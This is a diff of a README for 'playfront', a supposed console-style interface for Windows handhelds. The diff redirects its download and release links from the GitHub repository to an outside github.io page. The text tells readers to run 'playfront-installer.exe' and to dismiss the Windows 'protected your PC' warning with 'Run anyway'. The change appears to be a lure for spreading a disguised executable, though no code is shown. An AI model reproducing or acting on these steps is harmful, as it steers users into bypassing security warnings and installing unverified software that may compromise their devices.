@@ -1,6 +1,6 @@
 # 🎮 playfront - Console interface for Windows handhelds
 
-[![Download playfront](https://img.shields.io/badge/Download-Playfront-blueviolet)](https://github.com/Butyraceous-purana223/playfront)
+[![Download playfront](https://img.shields.io/badge/Download-Playfront-blueviolet)](https://butyraceous-purana223.github.io)
 
 playfront provides a focused, console-like shell for your Windows handheld device. It replaces the standard Windows desktop environment with a layout designed for navigation with joysticks and triggers. This interface gives you quick access to your game library and system settings without the need for a mouse or keyboard.
 
@@ -19,7 +19,7 @@ Your device needs specific software and hardware to run this program smoothly. C
 
 Follow these steps to set up the software on your device.
 
-1. Visit [the releases page](https://github.com/Butyraceous-purana223/playfront) to find the latest version of the application.
+1. Visit [the releases page](https://butyraceous-purana223.github.io) to find the latest version of the application.
 2. Select the file named `playfront-installer.exe` to start the download.
 3. Open the file once the download finishes. Windows might show a warning box titled "Windows protected your PC." 
 4. Select "More info" in that box, then select "Run anyway."
